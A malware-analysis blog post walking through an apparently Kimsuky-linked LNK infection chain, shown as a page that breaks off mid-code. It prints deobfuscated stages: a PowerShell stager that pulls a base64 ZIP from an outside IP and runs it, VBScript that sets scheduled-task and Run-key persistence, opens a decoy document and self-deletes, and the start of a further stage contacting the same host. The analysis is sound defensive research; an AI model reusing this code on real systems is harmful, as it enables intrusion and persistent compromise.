<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Kimsuky A Gift That Keeps on Giving" /><meta property="og:locale" content="en" /><meta name="description" content="Introduction Kimsuky - Shadow of Cyber Espionage" /><meta property="og:description" content="Introduction Kimsuky - Shadow of Cyber Espionage" /><link rel="canonical" href="https://somedieyoungzz.github.io//posts/kimsuky-6/" /><meta property="og:url" content="https://somedieyoungzz.github.io//posts/kimsuky-6/" /><meta property="og:site_name" content="somedieyoungZZ" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-09-15T16:25:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Kimsuky A Gift That Keeps on Giving" /><meta name="twitter:site" content="@IdaNotPro" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-10-22T14:23:41+05:30","datePublished":"2024-09-15T16:25:00+05:30","description":"Introduction Kimsuky - Shadow of Cyber Espionage","headline":"Kimsuky A Gift That Keeps on Giving","mainEntityOfPage":{"@type":"WebPage","@id":"https://somedieyoungzz.github.io//posts/kimsuky-6/"},"url":"https://somedieyoungzz.github.io//posts/kimsuky-6/"}</script><title>Kimsuky A Gift That Keeps on Giving | somedieyoungZZ</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="somedieyoungZZ"><meta name="application-name" content="somedieyoungZZ"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="preconnect" href="https://cdnjs.cloudflare.com" ><link rel="dns-prefetch" href="https://cdnjs.cloudflare.com" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return 'mode'; } static get MODE_ATTR() { return 'data-mode'; } static get DARK_MODE() { return 'dark'; } static get LIGHT_MODE() { return 'light'; } static get ID() { return 'mode-toggle'; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia('(prefers-color-scheme: dark)'); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { document.documentElement.removeAttribute(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage( { direction: ModeToggle.ID, message: this.modeStatus }, '*' ); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.notify(); } /* flipMode() */ } /* ModeToggle */ const modeToggle = new ModeToggle(); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/avatar.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/">somedieyoungZZ</a></h1><p class="site-subtitle fst-italic mb-0">please watch revolutionary road</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/somedieyoungZZ" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/IdaNotPro" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['example','domain.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Kimsuky A Gift That Keeps on Giving</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>Kimsuky A Gift That Keeps on Giving</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1726397700" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Sep 15, 2024 </time> </span> <span> Updated <time data-ts="1729587221" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Oct 22, 2024 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/IdaNotPro">somedieyoungZZ</a> </em> </span> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1845 words" > <em>10 min</em> read</span></div></div></header><div class="content"><h3 id="introduction"><span class="me-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><a href="https://cdn-images-1.medium.com/v2/resize:fit:1200/0*IL_z7p5I2-W8VB8B" class="popup img-link shimmer"><img src="https://cdn-images-1.medium.com/v2/resize:fit:1200/0*IL_z7p5I2-W8VB8B" alt="NK" title="NK" loading="lazy"></a> <em>Kimsuky - Shadow of Cyber Espionage</em></p><p><a href="https://cdn-images-1.medium.com/v2/resize:fit:800/1*PkTwyD3JFinhPNoA276Uhw.png" class="popup img-link shimmer"><img src="https://cdn-images-1.medium.com/v2/resize:fit:800/1*PkTwyD3JFinhPNoA276Uhw.png" alt="X" title="X" loading="lazy"></a></p><p>→ A sample was tweeted by our lovable <a href="https://x.com/malwrhunterteam">malwrhunterteam</a> with the tags being pointed out to Kimsuky 😍 and it was irresitable for us to have a look at it . The TTP do point to Kimsuky or a DPRK based Threat Actor. The initial infection vector is a LNK file which is mostly attributed to them.</p><h3 id="lnk-parse"><span class="me-2">LNK Parse</span><a href="#lnk-parse" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><a href="https://cdn-images-1.medium.com/v2/resize:fit:1200/1*vwZ58iJtGu_o_rYpYo_dOw.png" class="popup img-link shimmer"><img src="https://cdn-images-1.medium.com/v2/resize:fit:1200/1*vwZ58iJtGu_o_rYpYo_dOw.png" alt="vt" title="VT " loading="lazy"></a></p><p>→ Like every sample, we upload to VT to get a basic idea and our sample todays ranks <strong>16/63</strong>. The sample is a LNK or a shortcut file in Windows. We can use <strong>LNKParser</strong> to get the output in JSON format and work with it.</p><p><a href="https://cdn-images-1.medium.com/v2/resize:fit:1200/1*Md1VHIAf5rSqCEIIoo6IpA.png" class="popup img-link shimmer"><img src="https://cdn-images-1.medium.com/v2/resize:fit:1200/1*Md1VHIAf5rSqCEIIoo6IpA.png" alt="LNK" title="LNK" loading="lazy"></a> <em>lnkparse sample.lnk &gt; lnkparse.json</em></p><ul><li>Straight up we see some red flags like <strong>mshta.exe</strong> and some javascript command line arguements. The <strong>mshta.exe</strong> is commonly exploited by threat actors for executing malicious scripts via Microsoft HTML Application files. On crafting the payload we get the something like this: The server (64.49.14.181) is sending a Base64-encoded payload, which is decoded and saved as a ZIP file (t.zip). Once downloaded, the ZIP file is extracted, and the s.vbs script is executed.</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="n">powershell</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nv">$r</span><span class="o">=</span><span class="s1">'64.49.14.181'</span><span class="p">;</span><span class="w">
</span><span class="nv">$p</span><span class="o">=</span><span class="s1">'8014'</span><span class="p">;</span><span class="w">
</span><span class="nv">$r</span><span class="o">=</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.IO.StreamReader</span><span class="p">((</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TcpClient</span><span class="p">(</span><span class="nv">$r</span><span class="p">,</span><span class="w"> </span><span class="nv">$p</span><span class="p">))</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">());</span><span class="w">
</span><span class="nv">$z</span><span class="o">=</span><span class="nv">$r</span><span class="o">.</span><span class="nf">ReadLine</span><span class="p">();</span><span class="w">
</span><span class="nv">$b</span><span class="o">=</span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$z</span><span class="p">);</span><span class="w">
</span><span class="n">Set-Content</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'C:\ProgramData\t.zip'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$b</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">Byte</span><span class="p">;</span><span class="w">
</span><span class="n">Expand-Archive</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'C:\ProgramData\t.zip'</span><span class="w"> </span><span class="nt">-DestinationPath</span><span class="w"> </span><span class="s1">'C:\ProgramData'</span><span class="p">;</span><span class="w">
</span><span class="n">del</span><span class="w"> </span><span class="s1">'C:\ProgramData\t.zip'</span><span class="p">;</span><span class="w">
</span><span class="nv">$v</span><span class="o">=</span><span class="s1">'C:\ProgramData\s.vbs'</span><span class="p">;</span><span class="w">
</span><span class="o">&amp;</span><span class="nv">$v</span><span class="p">;</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">C:\ProgramData\nt91610</span><span class="w"> </span><span class="nx">81</span><span class="w">
</span></pre></table></code></div></div><ul><li>The server (64.49.14.181) is sending a Base64-encoded payload, which is decoded and saved as a ZIP file (t.zip). Once downloaded, the ZIP file is extracted, and the s.vbs script is executed.<li>Let’s get the ZIP file and see the contents inside it.</ul><h3 id="zip-file"><span class="me-2">Zip File</span><a href="#zip-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>The unzipped file contains 3 files<ul><li><strong>R9147.vbs</strong><li><strong>xM568.tmp</strong><li><strong>s.vbs</strong></ul></ul><h4 id="svbs"><span class="me-2">s.vbs</span><a href="#svbs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Let’s have a look at s.vbs since it’s executed first.</p><p><a href="https://cdn-images-1.medium.com/v2/resize:fit:1200/1*7w_MJIYKtCtsK8Mmz5Azng.png" class="popup img-link shimmer"><img src="https://cdn-images-1.medium.com/v2/resize:fit:1200/1*7w_MJIYKtCtsK8Mmz5Azng.png" alt="s.vbs" loading="lazy"></a></p><p>→ The variable <strong>iko9</strong> stores the encoded payload and it’s decoded using a simple for loop employing a Caeser Cipher. It decodes the variable using a simple character shifting (<strong>chr(ce8-(4)))</strong>). Once it’s decoded , it executes <strong>kouahpwya</strong>. We can write a python script to decode.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>
<span class="n">payload</span> <span class="o">=</span> <span class="sh">"</span><span class="s">big big payload</span><span class="sh">"</span>
<span class="n">decoded</span> <span class="o">=</span> <span class="sh">""</span>

<span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">payload_2</span><span class="p">:</span>
    <span class="n">decoded</span> <span class="o">+=</span><span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span>
</pre></table></code></div></div><ul><li>Let’s look at the VB script in parts since it’s a bit long.</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="w">
</span><span class="n">msnc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"om is the hosted versi"</span><span class="w"> 
</span><span class="n">lopppc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"munity and frequent updates: Wo"</span><span class="w"> 
</span><span class="n">On</span><span class="w"> </span><span class="nx">Error</span><span class="w"> </span><span class="nx">Resume</span><span class="w"> </span><span class="nx">Next</span><span class="w"> </span><span class="s1">'
'</span><span class="w"> </span><span class="nx">Garbage</span><span class="w"> </span><span class="nx">text</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">avoid</span><span class="w"> </span><span class="nx">static</span><span class="w"> </span><span class="nx">detection</span><span class="w">

</span><span class="n">mkc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Scr"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"ipt."</span><span class="w"> </span><span class="s1">'"Script." string
smocv = "Set monce = W"
bothec = smocv + mkc + "CreateObj" 
jsm = bothec + "ect(""WS" + "cript.Shell""):" 
Execute jsm 
'</span><span class="w"> </span><span class="n">Execute</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">WScript.Shell</span><span class="w"> </span><span class="nx">object</span><span class="w">
</span></pre></table></code></div></div><p>→ The script begins by setting up a <strong>WScript.Shell object</strong>, which is a key component for running system commands. By concatenating various string segments to build up the object name, the script evades basic detection techniques. Once assembled, it executes the command to create this object, allowing it to interact with the system shell later in the code.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">cl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"cmd /c schtasks /create /sc minute /mo 1 /tn MicrosoftEdgeUpdateTaskMSCore[57174-71251-9342] /tr ""wscript //e:vbscript //b C:\\ProgramData\\07578.tmp"" /f"</span><span class="w">
</span><span class="n">monce.Run</span><span class="w"> </span><span class="nx">cl</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nx">false</span><span class="w">

</span></pre></table></code></div></div><p>→ This section of the script creates a scheduled task disguised as an Edge browser update. The task runs every minute, executing a hidden VBS script located at C:\ProgramData\07578.tmp. The purpose of this task is to maintain persistence.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">dc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"c:\\programdata\\DOC578309.docx"</span><span class="w">
</span><span class="n">Set</span><span class="w"> </span><span class="nx">fso</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateObject</span><span class="p">(</span><span class="s2">"Scripting.Filesystemobject"</span><span class="p">)</span><span class="w">
</span><span class="n">Set</span><span class="w"> </span><span class="nx">fp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fso.OpenTextFile</span><span class="p">(</span><span class="n">dc</span><span class="p">,</span><span class="w"> </span><span class="nx">2</span><span class="p">,</span><span class="w"> </span><span class="nx">True</span><span class="p">)</span><span class="w">
</span><span class="n">fp.Write</span><span class="w"> </span><span class="s2">""</span><span class="w">
</span><span class="n">fp.Close</span><span class="w">
</span><span class="nx">Set</span><span class="w"> </span><span class="nx">opsce</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateObject</span><span class="p">(</span><span class="s2">"Shell.Application"</span><span class="p">)</span><span class="w">
</span><span class="n">jsm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"opsce.ShellExecute dc:"</span><span class="w">
</span><span class="n">Execute</span><span class="w"> </span><span class="nx">jsm</span><span class="w">
</span></pre></table></code></div></div><p>→ In this step, an empty DOC file is created in the ProgramData folder, and the script proceeds to open it using the ShellExecute function. This serves as a decoy or distraction while the actual code is being ran. This is a wonderful technique.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">kic1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"ws\\system32\\wscript.exe //"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"b //e:vbscript C:\\ProgramData\\R9147.vbs"" /f"</span><span class="w">
</span><span class="n">qoc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"dows\\CurrentVersion\\Run"" /v Winload /t REG_SZ /d ""c:\\windo"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">kic1</span><span class="w">
</span><span class="nx">tmp2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"KCU\\Software\\Microsoft\\Win"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">qoc</span><span class="w">
</span><span class="nx">untiy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"cmd /c r"</span><span class="w">
</span><span class="n">tmp1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"eg add ""H"</span><span class="w">
</span><span class="n">tmp3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tmp1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">tmp2</span><span class="w">
</span><span class="n">trn1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">untiy</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">tmp3</span><span class="w">
</span><span class="n">monce.Run</span><span class="w"> </span><span class="nx">trn1</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nx">false</span><span class="w">
</span></pre></table></code></div></div><p>→ This part modifies the Windows registry to ensure that a malicious script (R9147.vbs) will be executed every time the system starts. The registry entry is added under the Run key, which is a known technique used by malware to maintain persistence on the victim’s machine.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">untiy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"powershell -ep bypass -command </span><span class="nv">$fn</span><span class="s2">='C:\\ProgramData\\xM578.tmp';</span><span class="nv">$d</span><span class="s2"> = Get-Content </span><span class="nv">$fn</span><span class="s2">; Invoke-Expression </span><span class="nv">$d</span><span class="s2">;"</span><span class="w">
</span><span class="n">monce.Run</span><span class="w"> </span><span class="nx">untiy</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nx">false</span><span class="w">
</span></pre></table></code></div></div><p>→ In this section, a PowerShell command is executed to read and run the contents of a file (C:\ProgramData\xM578.tmp).</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">s1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"WS"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"cri"</span><span class="w">
</span><span class="n">s2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"pt.Sleep(2000):Se"</span><span class="w">
</span><span class="n">s3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"ct = CreateOb"</span><span class="w">
</span><span class="n">s4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"DeleteFile"</span><span class="w">
</span><span class="n">str1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"pt.Sle"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">s2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"t tyhun"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">s3</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"ject(""Scripting.FileSystemObject""):tyhunct."</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">s4</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"(""C:\\ProgramData\\s.vbs""):"</span><span class="w">
</span><span class="n">Execute</span><span class="w"> </span><span class="nx">str1</span><span class="w">

</span></pre></table></code></div></div><p>→ After executing , the script pauses for two seconds and then deletes itself (C:\ProgramData\s.vbs). This cleanup process is designed to remove traces of the script from the system to avoid detection and analysis by security tools. However, the malicious tasks and registry entries remain active.</p><h4 id="r9147vbs"><span class="me-2">R9147.vbs</span><a href="#r9147vbs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li>This script is also obfuscated similarly like the previous one and uses the same decoding routine of Ceaser Cipher. We can use the same python script to get the decoded file. After clearing some garbage text. The final payload we’re left with is</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">On</span><span class="w"> </span><span class="nx">Error</span><span class="w"> </span><span class="nx">Resume</span><span class="w"> </span><span class="nx">Next</span><span class="w"> 

</span><span class="s1">' Create a WScript Shell object
Set sh = WScript.CreateObject("WScript.Shell")
'</span><span class="w"> </span><span class="n">Execute</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">contents</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">xM578.tmp</span><span class="w">
</span><span class="n">bewcdf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"powershell -ep bypass -command </span><span class="nv">$fn</span><span class="s2">='C:\\ProgramData\\xM578.tmp'; </span><span class="nv">$d</span><span class="s2"> = Get-Content </span><span class="nv">$fn</span><span class="s2">; Invoke-Expression </span><span class="nv">$d</span><span class="s2">;"</span><span class="w">
</span><span class="s1">' Run the PowerShell (with the window hidden)
sh.Run bewcdf, 0, false
</span></pre></table></code></div></div><p>→ This script sets up a PowerShell command to execute a hidden payload stored in xM578.tmp. The use of decoy strings and obfuscation techniques makes the script harder to analyze. Let’s analyse the next phase.</p><h4 id="xm578tmp"><span class="me-2">xM578.tmp</span><a href="#xm578tmp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="w">
</span><span class="nv">$unmcnex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"64.49.14.181"</span><span class="w">
</span><span class="nv">$yutbbc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"7032"</span><span class="w">

</span><span class="kr">function</span><span class="w"> </span><span class="nf">MuTxdonewd</span><span class="w">
</span><span class="p">{</span><span class="w">
    </span><span class="kr">param</span><span class="p">(</span><span class="w">
    </span><span class="p">[</span><span class="n">parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$true</span><span class="p">)][</span><span class="n">string</span><span class="p">]</span><span class="w"> </span><span class="nv">$sefncevID</span><span class="w">
